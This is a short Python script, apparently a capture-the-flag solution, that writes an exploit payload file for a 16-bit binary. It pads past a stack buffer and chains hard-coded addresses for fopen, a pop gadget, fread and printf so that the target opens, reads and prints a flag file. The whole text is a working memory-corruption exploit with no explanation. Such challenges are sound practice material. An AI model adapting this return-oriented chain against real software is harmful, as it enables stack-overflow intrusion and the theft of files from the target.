def serialize(b):
    return str(~b).encode() + b" "

# 13*2 + 26 = 52, IP at [SS:BP-52]
new_lines = b"2570 " * 13

fopen = 0x23ed
flag_filename = 0x1c2
read_mode = 0x167

fread = 0x24df
#buf = 0x1c7
buf = 0x20f
size = 1
nmemb = 0x50
fd = 0x378

#builtin_printf = 0x05d5
builtin_printf = 0x05da

pop_si_di_ret = 0x16c

f = open("exploit.txt", "wb")
f.write(b"capturetheflag\r\n")
f.write(new_lines)
f.write(serialize(fopen) + serialize(pop_si_di_ret) + serialize(flag_filename) + serialize(read_mode))
f.write(serialize(fread) + serialize(builtin_printf) + serialize(buf) + serialize(size) + serialize(nmemb) + serialize(fd))
f.write(b" 2570\r\n")